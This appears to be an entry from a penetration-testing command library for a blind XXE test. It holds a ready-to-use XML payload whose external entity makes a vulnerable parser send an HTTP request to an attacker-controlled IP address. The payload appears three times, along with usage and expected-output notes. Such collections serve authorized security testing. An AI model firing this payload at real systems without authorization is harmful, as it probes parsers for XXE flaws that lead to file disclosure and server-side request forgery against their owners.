---
data: >-
  <?xml version="1.0" encoding="utf-8"?> <!DOCTYPE dtgmlf6 [ <!ENTITY dtgmlf6ent
  SYSTEM "http://122.180.248.81/"> ]>
  <GeneralSearch>&dtgmlf6ent;</GeneralSearch>
tags:
  - xxe
  - xml-payload
type: command
executor: bash
platforms:
  - Web
id: f911b000-94ab-4ab5-975c-2d211f1b41e0
created_at: '2025-12-13T09:00:28.031Z'
updated_at: '2025-12-13T09:00:28.031Z'
verified: false
validated: true
submitted: true
---
# XXE Initial Test Payload

## Command

```xml
<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE dtgmlf6 [ <!ENTITY dtgmlf6ent SYSTEM "http://122.180.248.81/"> ]> <GeneralSearch>&dtgmlf6ent;</GeneralSearch>
```

## Description

XML payload for initial blind XXE test to initiate an HTTP request to the attacker's domain.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `SYSTEM` | Defines an external entity to fetch from the specified URL | Yes |

## Examples

### Basic Usage

```xml
<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE dtgmlf6 [ <!ENTITY dtgmlf6ent SYSTEM "http://122.180.248.81/"> ]> <GeneralSearch>&dtgmlf6ent;</GeneralSearch>
```

### Advanced Usage

Change the SYSTEM URL to a different attacker-controlled endpoint.

## Expected Output

HTTP request to http://122.180.248.81/ indicating vulnerability.

## Related

- [[commands/post-xxe-payload-request]]
- [[procedures/Inject-XXE-Payload-and-Verify-Exploitation]]
